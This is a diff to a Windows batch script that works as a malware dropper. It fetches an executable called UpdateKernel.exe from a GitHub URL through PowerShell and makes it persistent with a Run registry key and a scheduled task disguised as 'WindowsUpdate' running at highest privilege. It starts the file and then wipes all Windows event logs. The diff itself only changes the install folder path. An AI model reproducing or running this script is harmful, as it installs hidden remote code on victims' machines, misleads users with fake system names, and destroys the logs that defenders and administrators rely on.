@@ -23,8 +23,8 @@ mkdir "%systemdrive%\programdata\GG-Win"
 echo ----------------------------copy-my-files-to-web-sever-------------------------------------
 PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/UpdateKernel.exe','%programdata%\GG-Win\UpdateKernel.exe')
 echo -----------start-paylod------------------------
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\UpdateKernel.exe"
-schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\GG-Win\UpdateKernel.exe" /f
-start %programdata%\GG-Win\UpdateKernel.exe
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win1\UpdateKernel.exe"
+schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\GG-Win1\UpdateKernel.exe" /f
+start %programdata%\GG-Win1\UpdateKernel.exe
 echo -----------delete-evnt-log-------------------------------------------
 for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
